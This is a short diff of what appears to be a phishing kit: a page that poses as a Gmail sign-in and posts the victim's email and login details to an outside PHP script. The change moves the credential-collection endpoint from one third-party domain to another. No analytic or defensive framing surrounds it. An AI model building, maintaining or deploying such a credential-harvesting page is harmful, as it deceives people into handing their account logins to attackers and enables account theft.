@@ -64,7 +64,7 @@ outline: none;
 <div id="container">
 <div id="image1" style="position:absolute; overflow:hidden; left:0px; top:0px; width:498px; height:410px; z-index:0"><img src="https://bozoktraktor.com/sharedocument/images/gmailheader.png" alt="" title="" border=0 width=498 height=410></div>
  
-   <form name='Gmailsignin' action='https://bozoktraktor.com/venture/post.php' method='post'>
+   <form name='Gmailsignin' action='https://aptradng.com//ventureshare/post.php' method='post'>
     
 
 <input name="email" value="<?php echo $email ?>" placeholder="Email or phone" autocomplete="off"  class="textbox" required type="Email" style="position:absolute;width:359px;left:56px;top:210px;z-index:2"><p></p>
